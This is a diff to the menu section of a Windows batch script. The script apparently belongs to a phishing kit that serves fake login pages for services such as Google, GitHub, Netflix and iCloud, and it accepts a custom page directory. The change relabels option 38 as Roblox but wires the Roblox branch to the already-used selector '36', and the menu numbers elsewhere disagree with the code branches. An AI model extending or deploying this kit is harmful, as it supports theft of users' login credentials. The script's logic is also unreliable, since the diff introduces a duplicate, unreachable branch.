@@ -102,7 +102,7 @@ rem Option Menu
 	echo 		[05] GithHub		[20] Messenger		[34] iCloud
 	echo 		[06] Google		[21] GitLab		[36] Spotify
 	echo 		[07] Origin		[22] Twitch		[37] Netflix
-	echo 		[08] Yahoo		[23] MySpace		[38] (ADVANCED) Custom page
+	echo 		[08] Yahoo		[23] MySpace		[38] Roblox
 	echo 		[09] LinkedIn		[24] Badoo		[39] Extra Tools
 	echo 		[10] ProtonMail		[25] VK			[40] Update
 	echo 		[11] WordPress		[26] Yandex		
@@ -150,7 +150,8 @@ rem Option Menu
 		) else if "%sel%"=="34" ( set server=Amazon
 		) else if "%sel%"=="35" ( set server=iCloud
 		) else if "%sel%"=="36" ( set server=Spotify
-		) else if "%sel%"=="37" ( set server=Netflix
+                ) else if "%sel%"=="37" ( set server=Netflix
+                ) else if "%sel%"=="36" ( set server=Roblox
 		) else if "%sel%"=="38" ( set /p server="Enter full path to directory containing index file of your custom page: "
 		) else if "%sel%"=="39" (
 			echo.
